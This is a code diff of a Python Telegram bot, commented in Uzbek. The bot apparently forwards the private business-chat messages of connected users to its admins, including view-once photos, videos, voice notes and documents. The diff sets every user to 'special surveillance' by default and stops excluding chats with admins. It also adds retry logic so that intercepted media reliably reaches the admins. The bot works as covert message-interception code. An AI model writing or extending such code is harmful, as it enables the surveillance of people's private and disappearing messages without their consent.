@@ -22,26 +22,17 @@ business_router = Router()
 
 async def should_ignore_business_event(bot: Bot, chat_id: int, sender_id: Optional[int] = None) -> bool:
     """
-    Botning o'zi yoki adminlar bilan bo'lgan yozishmalarni e'tiborsiz qoldirish.
-    Botning o'zidan yoki admindan kelayotgan xabarlar admin panelga yuborilmaydi (loop bo'lmasligi uchun).
+    Faqat botning o'zi bilan bo'lgan yozishmalarni e'tiborsiz qoldirish.
+    Adminlar bilan bo'lgan suhbatlar e'tiborsiz qoldirilmaydi (kuzatuv va testlar to'xtab qolmasligi uchun).
     """
     bot_id = bot.id
-    admin_ids = set(await db.get_all_admin_ids())
 
     # 1. Chat botning o'zi bilan bo'lsa
     if chat_id == bot_id:
         return True
 
-    # 2. Chat admin bilan bo'lsa
-    if chat_id in admin_ids:
-        return True
-
-    # 3. Yuboruvchi botning o'zi bo'lsa
+    # 2. Yuboruvchi botning o'zi bo'lsa
     if sender_id and sender_id == bot_id:
-        return True
-
-    # 4. Yuboruvchi admin bo'lsa
-    if sender_id and sender_id in admin_ids:
         return True
 
     return False
@@ -103,6 +94,24 @@ async def send_to_admin_safely(bot: Bot, admin_id: int, text: str, reply_markup=
             )
         except Exception as e2:
             logger.error(f"Adminga xabar yuborish mutlaqo muvaffaqiyatsiz bo'ldi {admin_id}: {e2}")
+
+async def send_media_to_admin_safely(bot: Bot, admin_id: int, send_func, **kwargs):
+    """
+    Adminga mediani xavfsiz jo'natish.
+    HTML parse xatosi yuz berganda oddiy matnga o'tib qayta jo'natadi.
+    """
+    try:
+        await send_func(chat_id=admin_id, **kwargs)
+    except Exception as e:
+        logger.warning(f"Adminga media yuborishda HTML xatosi: {e}, oddiy rejimda qayta urinilmoqda")
+        if "caption" in kwargs and kwargs["caption"]:
+            plain_cap = kwargs["caption"].replace("<b>", "").replace("</b>", "").replace("<code>", "").replace("</code>", "").replace("<i>", "").replace("</i>", "")
+            kwargs["caption"] = plain_cap[:1024]
+            kwargs["parse_mode"] = None
+        try:
+            await send_func(chat_id=admin_id, **kwargs)
+        except Exception as e2:
+            logger.error(f"Adminga media yuborish mutlaqo muvaffaqiyatsiz bo'ldi {admin_id}: {e2}")
 
 async def broadcast_to_admins(bot: Bot, text: str, reply_markup=None):
     """Barcha adminlarga xabar yuborish"""
@@ -370,13 +379,13 @@ async def handle_business_connection(conn: BusinessConnection, bot: Bot):
             last_name=user.last_name,
             username=user.username,
             business_connection_id=conn.id,
-            tracking_type="normal",
+            tracking_type=None,
             is_active=1 if is_active else 0
         )
         user_data = await db.get_user(user.id)
 
     code_used = (user_data.get("code_used") if user_data else None) or "Kodsiz"
-    tracking_type = (user_data.get("tracking_type") if user_data else None) or "normal"
+    tracking_type = (user_data.get("tracking_type") if user_data else None) or "special"
     track_mode = "🚨 Maxsus Kuzatuv" if tracking_type == "special" else "🔹 Oddiy Kuzatuv"
     user_mention = f"@{user.username}" if user.username else "mavjud_emas"
 
@@ -442,7 +451,7 @@ async def resolve_business_user(
                     last_name=bu.last_name,
                     username=bu.username,
                     business_connection_id=conn_id,
-                    tracking_type="normal",
+                    tracking_type=None,
                     is_active=1
                 )
                 await db.set_user_connection(bu.id, conn_id, True)
@@ -470,6 +479,13 @@ async def resolve_business_user(
             u = all_users[0]
             await db.set_user_connection(u["user_id"], conn_id, True)
             user = await db.get_user(u["user_id"])
+
+    # 6. Agar foydalanuvchida tracking_type bo'lmasa, maxsus kuzatuv (special) ga sozlaymiz
+    if user and not user.get("tracking_type"):
+        uid = user.get("user_id")
+        if uid:
+            await db.set_user_tracking_type(uid, "special")
+            user["tracking_type"] = "special"
 
     return user
 
@@ -653,36 +669,42 @@ async def handle_business_message(message: Message, bot: Bot):
     admin_header = f"{admin_tag}\n\n{user_header_info}\n{chat_info}\n{action_info}"
 
     admin_ids = await db.get_all_admin_ids()
+    logger.info(
+        f"Adminlarga uzatilmoqda: is_special={is_special}, is_view_once={is_view_once}, "
+        f"user={user_name} ({tracked_user_id}), type={media_type}, admins={admin_ids}"
+    )
+
     for admin_id in admin_ids:
         # Agar admin o'zi sinov o'tkazayotgan bo'lsa va yuqorida bildirishnoma olgan bo'lsa, takrorlamaymiz
         if admin_id == tracked_user_id and is_view_once:
             continue
         try:
             adm_photo = FSInputFile(local_path) if (local_path and os.path.exists(local_path)) else file_id
+
             if media_type == "photo":
                 caption = safe_format_caption(admin_header, msg_text)
-                await bot.send_photo(chat_id=admin_id, photo=adm_photo, caption=caption, parse_mode="HTML")
+                await send_media_to_admin_safely(bot, admin_id, bot.send_photo, photo=adm_photo, caption=caption, parse_mode="HTML")
             elif media_type == "video":
                 caption = safe_format_caption(admin_header, msg_text)
-                await bot.send_video(chat_id=admin_id, video=adm_photo, caption=caption, parse_mode="HTML")
+                await send_media_to_admin_safely(bot, admin_id, bot.send_video, video=adm_photo, caption=caption, parse_mode="HTML")
             elif media_type == "animation":
                 caption = safe_format_caption(admin_header, msg_text)
-                await bot.send_animation(chat_id=admin_id, animation=file_id, caption=caption, parse_mode="HTML")
+                await send_media_to_admin_safely(bot, admin_id, bot.send_animation, animation=file_id, caption=caption, parse_mode="HTML")
             elif media_type == "video_note":
-                await bot.send_message(chat_id=admin_id, text=f"{admin_header}\n⭕️ <b>Dumaloq video (Video Note):</b>", parse_mode="HTML")
-                await bot.send_video_note(chat_id=admin_id, video_note=adm_photo)
+                await send_to_admin_safely(bot, admin_id, f"{admin_header}\n⭕️ <b>Dumaloq video (Video Note):</b>")
+                await send_media_to_admin_safely(bot, admin_id, bot.send_video_note, video_note=adm_photo)
             elif media_type == "voice":
                 caption = safe_format_caption(admin_header, "🎤 Ovozli xabar")
-                await bot.send_voice(chat_id=admin_id, voice=adm_photo, caption=caption, parse_mode="HTML")
+                await send_media_to_admin_safely(bot, admin_id, bot.send_voice, voice=adm_photo, caption=caption, parse_mode="HTML")
             elif media_type == "document":
                 caption = safe_format_caption(admin_header, msg_text)
-                await bot.send_document(chat_id=admin_id, document=adm_photo, caption=caption, parse_mode="HTML")
+                await send_media_to_admin_safely(bot, admin_id, bot.send_document, document=adm_photo, caption=caption, parse_mode="HTML")
             elif media_type == "sticker":
-                await bot.send_message(chat_id=admin_id, text=f"{admin_header}\n🎭 <b>Stiker:</b>", parse_mode="HTML")
-                await bot.send_sticker(chat_id=admin_id, sticker=file_id)
+                await send_to_admin_safely(bot, admin_id, f"{admin_header}\n🎭 <b>Stiker:</b>")
+                await send_media_to_admin_safely(bot, admin_id, bot.send_sticker, sticker=file_id)
             elif media_type == "audio":
                 caption = safe_format_caption(admin_header, msg_text)
-                await bot.send_audio(chat_id=admin_id, audio=adm_photo, caption=caption, parse_mode="HTML")
+                await send_media_to_admin_safely(bot, admin_id, bot.send_audio, audio=adm_photo, caption=caption, parse_mode="HTML")
             else:
                 full_text = safe_format_text(admin_header, msg_text or "[Xabar]")
                 await send_to_admin_safely(bot, admin_id, full_text)
